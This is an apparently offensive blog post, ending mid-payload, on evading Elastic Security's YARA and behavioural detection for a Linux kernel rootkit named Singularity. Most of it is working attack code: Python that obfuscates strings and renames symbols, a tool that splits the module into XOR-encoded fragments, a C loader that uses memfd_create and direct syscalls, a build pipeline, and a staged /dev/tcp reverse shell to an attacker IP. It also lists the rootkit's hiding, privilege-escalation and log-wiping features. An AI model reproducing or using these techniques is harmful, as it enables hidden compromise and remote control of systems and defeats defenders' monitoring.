---
title: "Evading Elastic Security: Linux Rootkit Detection Bypass"
description: Bypassing YARA rules and behavioral detection through string obfuscation, module fragmentation, XOR encoding, and ICMP reverse shell staging
categories: [Red Team]
tags: [Evasion]
author: 0xMatheuZ
images:
  - "https://i.imgur.com/5vHDN0B.png"
---

![imgur](https://giffiles.alphacoders.com/223/223415.gif)

Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity

# Introduction

Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.

This article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security's detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.

# Table of Contents

- [Introduction](#introduction)
- [Understanding the Threat Landscape: Elastic YARA Rules](#understanding-the-threat-landscape-elastic-yara-rules)
  - [Primary Detection Rules](#primary-detection-rules)
  - [Detection Signature Analysis](#detection-signature-analysis)
- [The Singularity Rootkit: Capabilities Overview](#the-singularity-rootkit-capabilities-overview)
  - [Core Features](#core-features)
- [Evasion Technique 1: String Obfuscation](#evasion-technique-1-string-obfuscation)
  - [The Problem](#the-problem)
  - [The Solution: Compile-Time String Fragmentation](#the-solution-compile-time-string-fragmentation)
  - [Implementation](#implementation)
- [Evasion Technique 2: Symbol Name Randomization](#evasion-technique-2-symbol-name-randomization)
  - [The Problem](#the-problem-1)
  - [The Solution: Intelligent Name Randomization](#the-solution-intelligent-name-randomization)
- [Evasion Technique 3: Module Fragmentation](#evasion-technique-3-module-fragmentation)
  - [The Problem](#the-problem-2)
  - [The Solution: Fragment + XOR Encoding + In-Memory Loading](#the-solution-fragment--xor-encoding--in-memory-loading)
  - [Custom Loader via memfd_create](#custom-loader-via-memfd_create)
- [Evasion Technique 4: Ftrace Helper Obfuscation](#evasion-technique-4-ftrace-helper-obfuscation)
  - [The Problem](#the-problem-3)
  - [The Solution: Rename Ftrace Framework Functions](#the-solution-rename-ftrace-framework-functions)
- [Build Pipeline: Automated Obfuscation Workflow](#build-pipeline-automated-obfuscation-workflow)
- [Final Test: Successful Evasion](#final-test-successful-evasion)
- [Bonus: Compilation Path Detection Bypass](#bonus-compilation-path-detection-bypass)
- [Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells](#bonus-2-bypassing-elastic-behavioral-detection-for-reverse-shells)
- [Conclusion](#conclusion)

# Understanding the Threat Landscape: Elastic YARA Rules

![imgur](https://i.imgur.com/6dUtAak.png)

In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.

![imgur](https://i.imgur.com/guHHiEj.png)

There were approximately 26 detections.

Upon investigation, I identified the specific Elastic YARA rules detecting our rootkit:


#### Primary Detection Rules

[Linux_Rootkit_BrokePKG.yar](https://raw.githubusercontent.com/elastic/protections-artifacts/refs/heads/main/yara/rules/Linux_Rootkit_BrokePKG.yar)

[Linux_Rootkit_Generic.yar](https://raw.githubusercontent.com/elastic/protections-artifacts/ff154ddf0762a4a030c8832eee7753cb19b950ff/yara/rules/Linux_Rootkit_Generic.yar)


```
Linux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names
Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns
Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations
Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions
Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms
Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits
```

#### Detection Signature Analysis

#### Generic Rootkit Detection (61229bdf)

```
Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc.
Condition: 4 or more matching strings
Total patterns: 57 distinct function names
```

#### Hook Pattern Detection (482bca48)
```
System strings: sys_call_table, kallsyms_lookup_name, kprobe
Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_
Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show
Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks)
```

#### License String Detection (5d17781b)
```
Targets: kallsyms_lookup_name_t + "license=GPL"
Condition: Both strings must be present
Purpose: Detects ftrace-based rootkits using kallsyms
```

#### Ftrace Helper Detection (f07bcabe)
```
Targets:
  - fh_install_hook
  - fh_remove_hook
  - fh_resolve_hook_address
Condition: 2 or more matching strings
```

#### BrokePKG Specific Detection (7b7d4581)
```
License strings:
  - author=R3tr074
  - name=brokepkg
  - description=Rootkit
  - license=GPL

Specific strings:
  - brokepkg
  - brokepkg: module revealed
  - br0k3_n0w_h1dd3n

Hook patterns:
  - nf_inet_hooks
  - ftrace_hook
  - hook_getdents
  - hook_kill
  - orig_tcp4_seq_show

Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
```

Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?

# The Singularity Rootkit: Capabilities Overview

Source: https://github.com/MatheuZSecurity/Singularity

Before diving into evasion techniques, let's understand what the Singularity rootkit accomplishes:

### Core Features

- Process Hiding: Hides processes from /proc.
- File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.)
- Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools
- Privilege Escalation: Provides root access via signal 59 (kill -59 <pid>) or environment variable (MAGIC=mtz)
- ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337)

Anti-Analysis Features:

- Blocks BPF programs and tracing
- Prevents ftrace manipulation by other users
- Disables module loading via init_module/finit_module hooks
- Filters /proc/kallsyms, /proc/modules, and tracefs
- Taint Clearing: Resets kernel taint flags to hide unsigned module loading
- Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit
- Module Stealth: Self-hiding from lsmod and /sys/module directory


# Evasion Technique 1: String Obfuscation

### The Problem

Elastic's YARA rules scan for static strings like "GPL" and "kallsyms_lookup_name". A simple strings command on our module would expose these signatures immediately.

The specific rule (5d17781b) detects:

```c
$str = "kallsyms_lookup_name_t"
$lic1 = "license=Dual BSD/GPL"
$lic2 = "license=GPL"
```

### The Solution: Compile-Time String Fragmentation

Our obfuscator breaks strings into separate compile-time constants that the C compiler concatenates during compilation. This prevents contiguous strings from appearing in the binary.

### Implementation

```python
def _obfuscate_license_strings(self, content: str) -> str:
    """
    Obfuscates MODULE_LICENSE/AUTHOR/DESCRIPTION strings
    To evade YARA rule: Linux.Rootkit.Generic (5d17781b)
    
    The rule detects: kallsyms_lookup_name_t AND license=GPL
    """
    
    # 1. Obfuscate MODULE_LICENSE("GPL")
    # Transform: MODULE_LICENSE("GPL") 
    # Into:      MODULE_LICENSE("G" "P" "L")
    content = re.sub(
        r'MODULE_LICENSE\s*\(\s*"GPL"\s*\)',
        'MODULE_LICENSE("G" "P" "L")',
        content
    )
    
    # 2. Obfuscate MODULE_LICENSE("Dual BSD/GPL")
    content = re.sub(
        r'MODULE_LICENSE\s*\(\s*"Dual BSD/GPL"\s*\)',
        'MODULE_LICENSE("Dual" " " "BSD" "/" "GPL")',
        content
    )
    
    # 3. Obfuscate MODULE_AUTHOR
    content = re.sub(
        r'MODULE_AUTHOR\s*\(\s*"([^"]+)"\s*\)',
        lambda m: f'MODULE_AUTHOR("{self._split_string(m.group(1))}")',
        content
    )
    
    # 4. Obfuscate MODULE_DESCRIPTION
    content = re.sub(
        r'MODULE_DESCRIPTION\s*\(\s*"([^"]+)"\s*\)',
        lambda m: f'MODULE_DESCRIPTION("{self._split_string(m.group(1))}")',
        content
    )
    
    return content
```

#### String Splitting Helper

```python
def _split_string(self, text: str) -> str:
    """Divide string in parts for obfuscation"""
    if len(text) <= 3:
        return '" "'.join(list(text))
    
    # Divide into chunks of 2-4 characters
    chunks = []
    i = 0
    while i < len(text):
        chunk_size = random.randint(2, min(4, len(text) - i))
        chunks.append(text[i:i+chunk_size])
        i += chunk_size
    
    return '" "'.join(chunks)
```

Before Obfuscation

```c
MODULE_LICENSE("GPL");
MODULE_AUTHOR("MatheuZSecurity");
MODULE_DESCRIPTION("Rootkit Researchers: https://discord.gg/66N5ZQppU7");
```

After Obfuscation

```c
MODULE_LICENSE("G" "P" "L");
MODULE_AUTHOR("Mathe" "uZ" "Secur" "ity");
MODULE_DESCRIPTION("Root" "kit " "Rese" "arche" "rs: " "http" "s://" "disc" "ord." "gg/6" "6N5Z" "QppU" "7");
```

### Why This Works

The C compiler concatenates adjacent string literals during compilation according to the C standard:

- Adjacent string literal tokens are concatenated

This means:
```c
"Hello" " " "World"  // Becomes "Hello World" at compile time
```

The binary's .rodata section stores this as a single contiguous string. However, the key insight: YARA rules scan the binary, not the source code. By fragmenting strings in source but allowing compiler concatenation, we break YARA pattern matching while maintaining functionality.

Verification

```bash
# Check for GPL string
strings obfuscated/singularity.ko | grep -i "GPL"
# No results

# But the module still loads correctly
modinfo obfuscated/singularity.ko | grep license
# license:        GPL

# The string exists in .modinfo section but fragmented
objdump -s obfuscated/singularity.ko -j .modinfo | grep -A2 license
```

#### Kallsyms Obfuscation

Similarly, we obfuscate kallsyms_lookup_name references:

```python
def _obfuscate_kallsyms_strings(self, content: str) -> str:
    """
    Obfuscates kallsyms_lookup_name references
    that are detected by Elastic
    """
    # Obfuscate kallsyms_lookup_name_t
    content = re.sub(
        r'kallsyms_lookup_name_t',
        'k' 'a' 'l' 'l' 's' 'y' 'm' 's' '_' 'l' 'o' 'o' 'k' 'u' 'p' '_' 'n' 'a' 'm' 'e' '_' 't',
        content
    )
    
    # Obfuscate kallsyms references
    content = re.sub(
        r'kallsyms_lookup_name',
        'k' 'a' 'l' 'l' 's' 'y' 'm' 's' '_' 'l' 'o' 'o' 'k' 'u' 'p' '_' 'n' 'a' 'm' 'e',
        content
    )
    
    return content
```

# Evasion Technique 2: Symbol Name Randomization

### The Problem

Rootkits typically use predictable naming patterns that become signatures:

```c
hook_getdents64
fake_tcp4_seq_show
hide_module
orig_kill
hacked_open
hooked_read
```

Elastic's YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:

```c
$rk1 = "rootkit"
$rk2 = "hide_"
$rk3 = "hacked_"
$rk4 = "fake_"
$rk5 = "hooked_"
$hook1 = "_getdents"
$hook2 = "_kill"
$hook3 = "_tcp4_seq_show"
```

### The Solution: Intelligent Name Randomization

Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:

```python
def _generate_random_name(self) -> str:
    """Generates random name that avoids YARA patterns"""
    # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_
    
    # Use generic names that look legitimate
    prefixes = ['sys', 'kern', 'dev', 'mm', 'fs', 'net', 'proc', 'sched']
    suffixes = ['handler', 'helper', 'worker', 'ops', 'func', 'entry', 'cb']
    
    prefix = random.choice(prefixes)
    suffix = random.choice(suffixes)
    middle = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6)))
    
    return f"{prefix}_{middle}_{suffix}"
```

#### Key Features

- No suspicious prefixes (hook_, fake_, hide_)
- Looks like legitimate kernel code
- Maintains internal consistency via mapping file
- Protects kernel API calls from renaming

#### Protected Names

The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:

```python
def _get_protected_names(self) -> Set[str]:
    """Names from kernel that should NOT be changed"""
    return {
        # Basic C types
        'int', 'void', 'long', 'char', 'size_t', 'ssize_t',
        
        # Essentials
        'module_init', 'module_exit', 'THIS_MODULE', 'current',
        'kmalloc', 'kfree', 'printk', 'pr_debug',
        'copy_from_user', 'copy_to_user',
        'fget', 'fput', 'kernel_read',
               
        # Structures
        'pt_regs', 'file', 'task_struct', 'sk_buff',
        
        # Entry points
        'main', 'init', 'exit',
    }
```

#### Function Name Extraction

The obfuscator scans source files for function definitions using multiple regex patterns:

```python
self.function_patterns = [
    r'\bnotrace\s+(?:static\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\s+(\w+)\s*\(',
    r'\bstatic\s+(?:notrace\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\s+(\w+)\s*\(',
    r'\bstatic\s+asmlinkage\s+\w+\s+(\w+)\s*\(',
    r'\basmlinkage\s+\w+\s+\*?\(?\*?(\w+)\)?',
    r'\b(\w+_init)\s*\(\s*void\s*\)',
    r'\b(\w+_exit)\s*\(\s*void\s*\)',
    r'\bHOOK\s*\([^,]+,\s*(\w+)\s*,',
    r'\btypedef\s+[^;]+\s+(\w+_t)\s*;',
]
```

#### Example Transformation

Before:

```c
// modules/hiding_directory.c
static notrace long hook_getdents64(const struct pt_regs *regs) {
    long res = orig_getdents64(regs);
    // ...
}

static notrace long hook_getdents(const struct pt_regs *regs) {
    long res = orig_getdents(regs);
    // ...
}
```

After:

```c
// obfuscated/modules/hiding_directory.c
static notrace long sys_abjker_handler(const struct pt_regs *regs) {
    long res = kern_wopqls_helper(regs);
    // ...
}

static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) {
    long res = net_xzpnrm_func(regs);
    // ...
}
```

#### Implementation Details

```python
def _replace_in_content(self, content: str, mapping: Dict[str, str]) -> str:
    """Replace names in content"""
    modified = content
    
    # Sort by descending length to avoid partial substitutions
    sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True)
    
    for old_name, new_name in sorted_items:
        # Use word boundary for exact substitution
        pattern = r'\b' + re.escape(old_name) + r'\b'
        modified = re.sub(pattern, new_name, modified)
    
    return modified
```

The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.

# Evasion Technique 3: Module Fragmentation

### The Problem

EDR solutions scan loaded kernel modules in both memory and on-disk. A monolithic .ko file presents a single attack surface that's easy to analyze:

- Signature scanning of the entire module
- Static analysis of ELF structure
- Symbol table enumeration

### The Solution: Fragment + XOR Encoding + In-Memory Loading

We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static analysis while maintaining functionality.

#### Fragmentation Pipeline:

```python
def fragment(self, chunk_size: int = 65536, encode: bool = True) -> List[bytes]:
    """
    Fragment the .ko into chunks
    
    Args:
        chunk_size: Size of each fragment (default: 64KB)
        encode: If True, apply XOR encoding
    
    Returns:
        List of fragments
    """
    print(f"\n[*] Fragmenting: {self.ko_path}")
    print(f"    Chunk size: {chunk_size} bytes")
    
    # Read the .ko file
    with open(self.ko_path, 'rb') as f:
        ko_data = f.read()
    
    original_size = len(ko_data)
    print(f"[+] Original size: {original_size} bytes")
    
    # Generate random XOR key
    xor_key = os.urandom(16) if encode else b'\x00' * 16
    
    # Fragment
    fragments = []
    num_chunks = (original_size + chunk_size - 1) // chunk_size
    
    for i in range(num_chunks):
        start = i * chunk_size
        end = min(start + chunk_size, original_size)
        chunk = ko_data[start:end]
        
        # Apply encoding if necessary
        if encode:
            chunk = self._xor_encode(chunk, xor_key)
        
        fragments.append(chunk)
        checksum = self._calculate_checksum(chunk)
        
        print(f"[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)")
    
    self.fragments = fragments
    
    # Metadata
    self.metadata = {
        'original_filename': self.ko_path.name,
        'original_size': original_size,
        'num_fragments': len(fragments),
        'chunk_size': chunk_size,
        'encoded': encode,
        'xor_key': xor_key.hex() if encode else None,
        'checksums': [self._calculate_checksum(f) for f in fragments]
    }
    
    return fragments
```

#### XOR Encoding

We use a simple but effective XOR cipher with a random 16-byte key:

```python
def _xor_encode(self, data: bytes, key: bytes) -> bytes:
    """Simple XOR encoding for obfuscation"""
    encoded = bytearray()
    key_len = len(key)
    
    for i, byte in enumerate(data):
        encoded.append(byte ^ key[i % key_len])
    
    return bytes(encoded)
```

While XOR is cryptographically weak, it serves our purpose:
- Breaks signature matching
- Fast to encode/decode
- Minimal overhead
- Easy to implement in C loader

#### Resulting Structure

```
fragments/
├── chunk_000.bin    # XOR-encoded fragment (64KB)
├── chunk_001.bin    # XOR-encoded fragment (64KB)
├── chunk_002.bin    # XOR-encoded fragment (64KB)
├── ...
├── chunk_N.bin      # Final fragment (variable size)
├── metadata.json    # Contains XOR key and checksums
└── reconstruct.sh   # Automated reconstruction script
```

#### Metadata Format

```json
{
  "original_filename": "singularity.ko",
  "original_size": 245632,
  "num_fragments": 4,
  "chunk_size": 65536,
  "encoded": true,
  "xor_key": "a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0",
  "checksums": [
    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce",
    "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae",
    "fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9"
  ]
}
```

#### Custom Loader via memfd_create

Instead of using insmod or modprobe, we implement a custom loader that:

- Reads encrypted fragments from disk
- Decodes them in memory
- Creates an anonymous memory file descriptor
- Writes the reconstructed module to the memory FD
- Loads the module via direct syscall

#### Loader Architecture

```c
/*
 * Singularity Loader
 * 
 * 1. Uses 32-bit syscall (finit_module) via inline assembly
 * 2. Reconstructs .ko from fragments in memory
 * 3. Decodes XOR encoding
 * 4. Uses memfd_create to avoid disk
 * 5. Direct syscall to avoid libc wrapper
 * 
 * Compile: gcc -o loader loader.c -static
 * Usage: ./loader fragments/
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <errno.h>
#include <dirent.h>
#include <stdint.h>

// Syscall numbers
#define __NR_finit_module   313
#define __NR_memfd_create   319

// Settings
#define MAX_FRAGMENTS       256
#define MAX_CHUNK_SIZE      (1024 * 1024)  // 1MB
#define XOR_KEY_SIZE        16
#define MODULE_FLAGS        0
```

#### Direct Syscall Implementation

To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:

```c
// Direct 64-bit syscall
static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) {
    long ret;
    register long r10 asm("r10") = arg3;
    
    asm volatile(
        "syscall"
        : "=a" (ret)
        : "0" (number), "D" (arg1), "S" (arg2), "d" (r10)
        : "rcx", "r11", "memory"
    );
    
    return ret;
}

// Direct 32-bit syscall
static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) {
    long ret;
    
    asm volatile(
        "int $0x80"
        : "=a" (ret)
        : "0" (number), "b" (arg1), "c" (arg2), "d" (arg3)
        : "memory"
    );
    
    return ret;
}
```

Why This Works:

- 32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction

#### Memory File Descriptor Creation

```c
static int create_memfd(const char *name) {
    long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0);
    
    if (fd < 0) {
        fprintf(stderr, "[!] memfd_create failed: %s\n", strerror(-fd));
        return -1;
    }
    
    printf("[+] memfd created: fd=%ld (%s)\n", fd, name);
    return (int)fd;
}
```

memfd_create creates an anonymous file that:

Exists only in memory (tmpfs)

- Automatically deleted when all file descriptors are closed
- Can be passed to finit_module() like a regular file

Remember that EDRs can monitor `memfd_create()` calls, and it can also be detected in `/proc/<pid>/fd/`

#### XOR Decoder

```c
static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}
```

#### Fragment Loading

```c
static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) {
    DIR *dir = opendir(dir_path);
    if (!dir) {
        perror("[!] opendir");
        return -1;
    }
    
    struct dirent *entry;
    int count = 0;
    
    printf("[*] Scanning fragments in: %s\n", dir_path);
    
    while ((entry = readdir(dir)) != NULL && count < MAX_FRAGMENTS) {
        // Look for chunk_XXX.bin
        if (strncmp(entry->d_name, "chunk_", 6) == 0 && 
            strstr(entry->d_name, ".bin") != NULL) {
            
            char filepath[512];
            snprintf(filepath, sizeof(filepath), "%s/%s", dir_path, entry->d_name);
            
            // Extract index
            int idx = atoi(entry->d_name + 6);
            
            // Read fragment
            FILE *f = fopen(filepath, "rb");
            if (!f) {
                fprintf(stderr, "[!] Error opening %s\n", filepath);
                continue;
            }
            
            fseek(f, 0, SEEK_END);
            long fsize = ftell(f);
            fseek(f, 0, SEEK_SET);
            
            uint8_t *data = malloc(fsize);
            if (!data) {
                fclose(f);
                continue;
            }
            
            size_t read_bytes = fread(data, 1, fsize, f);
            fclose(f);
            
            if (read_bytes != fsize) {
                free(data);
                continue;
            }
            
            fragments[count].data = data;
            fragments[count].size = fsize;
            fragments[count].index = idx;
            count++;
            
            printf("[+] Fragment %d: %s (%ld bytes)\n", idx, entry->d_name, fsize);
        }
    }
    
    closedir(dir);
    *num_fragments = count;
    
    // Sort fragments by index
    for (int i = 0; i < count - 1; i++) {
        for (int j = 0; j < count - i - 1; j++) {
            if (fragments[j].index > fragments[j + 1].index) {
                Fragment temp = fragments[j];
                fragments[j] = fragments[j + 1];
                fragments[j + 1] = temp;
            }
        }
    }
    
    return 0;
}
```

#### Module Loading

```c
static int load_module_stealthy(int fd, const char *params, int flags) {
    printf("[*] Loading module via direct syscall...\n");
    
    // Try 32-bit syscall first (more stealthy)
    long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags);
    
    if (ret < 0) {
        // Fallback to 64-bit
        ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags);
    }
    
    if (ret < 0) {
        fprintf(stderr, "[!] finit_module failed: %s\n", strerror(-ret));
        return -1;
    }
    
    printf("[+] Module loaded successfully!\n");
    return 0;
}
```

#### Complete Loading Workflow

```c
int main(int argc, char *argv[]) {
    // 1. Load fragments
    Fragment fragments[MAX_FRAGMENTS] = {0};
    int num_fragments = 0;
    load_fragments(fragments_dir, fragments, &num_fragments);
    
    // 2. Parse metadata (get XOR key)
    uint8_t xor_key[XOR_KEY_SIZE] = {0};
    int is_encoded = 0;
    parse_metadata(fragments_dir, xor_key, &is_encoded);
    
    // 3. Create memfd
    int memfd = create_memfd("module");
    
    // 4. Reconstruct module in memfd
    for (int i = 0; i < num_fragments; i++) {
        uint8_t *data = fragments[i].data;
        size_t size = fragments[i].size;
        
        // Decode if necessary
        if (is_encoded) {
            xor_decode(data, size, xor_key, XOR_KEY_SIZE);
        }
        
        // Write to memfd
        write(memfd, data, size);
    }
    
    // Reset FD position
    lseek(memfd, 0, SEEK_SET);
    
    // 5. Load module via direct syscall
    load_module_stealthy(memfd, module_params, MODULE_FLAGS);
    
    // 6. Cleanup
    close(memfd);
    return 0;
}
```

Advantages of This Approach:

- No .ko file on disk after compilation
- Fragments can be deleted after loading
- Memory-only module existence

Static Analysis Resistance:

- Individual fragments don't match YARA signatures
- XOR encoding breaks pattern matching
- No complete ELF structure visible on disk

# Evasion Technique 4: Ftrace Helper Obfuscation

### The Problem

Elastic's rule f07bcabe targets ftrace-based rootkits by detecting function names:

```
$str1 = "fh_install_hook"
$str2 = "fh_remove_hook"
$str3 = "fh_resolve_hook_address"
Condition: 2 of them
```

These are standard function names in ftrace hooking frameworks, making them easy signatures.

### The Solution: Rename Ftrace Framework Functions

Our obfuscator treats ftrace helper functions like any other custom function:

Before

```c
// ftrace/ftrace_helper.c
notrace int fh_resolve_hook_address(struct ftrace_hook *hook)
{
    hook->address = kallsyms_lookup_name(hook->name);
    // ...
}

notrace int fh_install_hook(struct ftrace_hook *hook)
{
    int err = fh_resolve_hook_address(hook);
    // ...
}

notrace void fh_remove_hook(struct ftrace_hook *hook)
{
    int err = unregister_ftrace_function(&hook->ops);
    // ...
}

notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;
    int err;
    for (i = 0; i < count; i++) {
        err = fh_install_hook(&hooks[i]);
        // ...
    }
}

notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;
    for (i = 0; i < count; i++)
        fh_remove_hook(&hooks[i]);
}
```

Example after Obfuscation:

```c
// obfuscated/ftrace/ftrace_helper.c
notrace int kern_xploqm_helper(struct ftrace_hook *hook)
{
    hook->address = kallsyms_lookup_name(hook->name);
    // ...
}

notrace int sys_zmnpqr_ops(struct ftrace_hook *hook)
{
    int err = kern_xploqm_helper(hook);
    // ...
}

notrace void net_abqzpx_handler(struct ftrace_hook *hook)
{
    int err = unregister_ftrace_function(&hook->ops);
    // ...
}

notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count)
{
    size_t i;
    int err;
    for (i = 0; i < count; i++) {
        err = sys_zmnpqr_ops(&hooks[i]);
        // ...
    }
}

notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count)
{
    size_t i;
    for (i = 0; i < count; i++)
        net_abqzpx_handler(&hooks[i]);
}
```

The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn't care about function names in loaded modules.

# Build Pipeline: Automated Obfuscation Workflow

Our automated build system chains all evasion techniques in a reproducible pipeline:

```bash
#!/bin/bash
set -e

echo "[*] Singularity Build"

rm -rf obfuscated fragments loader singularity_payload*

# 1. Obfuscate and compile
echo "[1] Obfuscating and compiling..."
python3 obfuscator/name_randomizer.py --input . --output obfuscated
cd obfuscated && make && cd ..

# 2. Fragment the .ko
echo "[2] Fragmenting module..."
python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments

# 3. CLEANUP - Remove obfuscated directory completely
echo "[4] Cleaning build artifacts..."
rm -rf obfuscated

echo "[+] Build complete! Final files:"
echo "    - fragments/ (module fragments)"
echo "    - loader"
echo "    - NO obfuscated code left behind"
```

# Final Test: Successful Evasion

![imgur](https://i.imgur.com/U7aDfWb.png)

In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.

![imgur](https://i.imgur.com/aIjbJH5.png)

Now, using the loader, we can load Singularity without being detected.

![imgur](https://i.imgur.com/v3R3Nau.png)

Testing one of singularity features hiding our process and become root.

![imgur](https://i.imgur.com/g6CxiOE.png)

With these techniques, we successfully bypass Elastic Security's static detection mechanisms.

# Bonus: Compilation Path Detection Bypass

![imgur](https://i.imgur.com/iNyIQHD.png)

By default, Elastic Security actively monitors compilation activity in `/dev/shm` and automatically terminates the process when it detects suspicious operations like compiling `loader.c` or the Singularity rootkit.

![imgur](https://i.imgur.com/Dc3TZhi.png)

**Simple Evasion Technique:**

This detection can be easily bypassed by compiling in alternative directories that are less monitored:
```bash
# Instead of /dev/shm (monitored):
gcc -o /dev/shm/loader loader.c  # Detected and killed

# Use alternative paths (less scrutinized):
gcc -o /tmp/loader loader.c      # Bypasses detection
gcc -o /var/tmp/loader loader.c  # Bypasses detection
```

**Why This Works:**

I think elastic's behavioral detection rules prioritize monitoring `/dev/shm` due to its common use in malware (thinking like an attacker, I would clearly use `/dev/shm` to download and use exploits in that directory). Alternative writable directories like `/tmp` and `/var/tmp` receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.

# Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells

The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic's behavioral detection rules caught the reverse shell execution.

## The Detection Problem

![imgur](https://i.imgur.com/mxNbtVX.png)
![imgur](https://i.imgur.com/3hPxXPD.png)

Elastic triggered two behavioral alerts:
- **"Suspicious Execution via setsid and nohup"** (Risk: 73)
- **"Shell Command Execution via Kworker"** (Risk: 99)

### Elastic's Behavioral Rules

**Rule 1:** Detects `setsid`/`nohup` + `/dev/tcp/*` patterns  
**Rule 2:** Detects shell processes using `/dev/tcp/` or `/dev/udp/`

Both rules automatically kill the process on detection.

**Rule 2 Detection Logic:**
```
process where event.action == "exec" and 
process.name in ("sh", "bash", "zsh", "dash", "zmodload") and
process.command_line like~ ("*/dev/tcp/*", "*/dev/udp/*", "*zsh/net/tcp*", "*zsh/net/udp*")
```

The rule scans the **entire command line** for `/dev/tcp/` patterns, making simple obfuscation ineffective.

## Original Detected Code

```c
// DETECTED by Elastic
snprintf(cmd, sizeof(cmd),
         "bash -c '"
         "PID=$$; "
         "kill -59 $PID; "
         "exec -a \"%s\" /bin/bash &>/dev/tcp/%s/%s 0>&1"
         "' &",
         PROC_NAME, YOUR_SRV_IP, SRV_PORT);

char *argv[] = {"/usr/bin/setsid", "/bin/bash", "-c", cmd, NULL};
```

**Why detected:**
- Uses `setsid` command
- `/dev/tcp/` appears in process arguments
- Shell spawned from kernel worker context

## Working Evasion: Staged Script Execution

The solution is to **separate the malicious payload from process arguments** by writing the script to disk first, then executing it.

### Key Changes

**1. Write the script to disk:**

```c
#define SCRIPT_PATH "/singularity"

// Hide kworker immediately
add_hidden_pid(current->pid);

// Create script with automatic process hiding
snprintf(script, sizeof(script),
         "#!/bin/bash\n"
         "exec 196<>/dev/tcp/%s/%s\n"
         "sh <&196 >&196 2>&196 &\n"
         "SHELL_PID=$!\n"
         "sleep 1\n"
         "kill -59 $SHELL_PID\n"
         "kill -59 $$\n",
         YOUR_SRV_IP, SRV_PORT);

f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755);
kernel_write(f, script, strlen(script), &pos);
```

**2. Execute with clean command line:**

```c
char *argv[] = {"/bin/bash", SCRIPT_PATH, NULL};
call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
```

### How It Works

**Step 1:** The rootkit immediately hides the kworker thread executing the payload using `add_hidden_pid(current->pid)`, making the entire process chain invisible from the start.

**Step 2:** It writes `/singularity` containing:
```bash
#!/bin/bash
exec 196<>/dev/tcp/192.168.200.164/8081
sh <&196 >&196 2>&196 &
